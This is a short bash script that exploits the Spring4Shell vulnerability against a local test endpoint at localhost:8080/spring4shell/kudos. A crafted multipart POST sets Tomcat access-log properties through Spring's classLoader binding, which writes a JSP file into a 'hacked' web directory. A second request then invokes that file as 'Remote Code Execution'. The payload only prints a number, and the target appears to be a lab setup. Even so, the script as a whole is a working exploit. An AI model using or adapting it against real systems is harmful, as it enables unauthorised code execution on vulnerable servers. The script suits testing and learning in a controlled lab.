#!/usr/bin/env bash 
NC=$'\e[0m' # No Color
BOLD=$'\033[1m'
UNDERLINE=$'\033[4m'
RED=$'\e[31m'
GREEN=$'\e[32m'
BLUE=$'\e[34m'
ORANGE=$'\x1B[33m'

echo -e "\n${BOLD}Exploit End Point${NC}"
curl -X POST \
  -H "pre:<%" \
  -H "post:;%>" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/hacked' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=index' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  http://localhost:8080/spring4shell/kudos

echo -e "\n${RED}Invoking Remote Code Execution${NC}"
curl http://localhost:8080/hacked/index.jsp
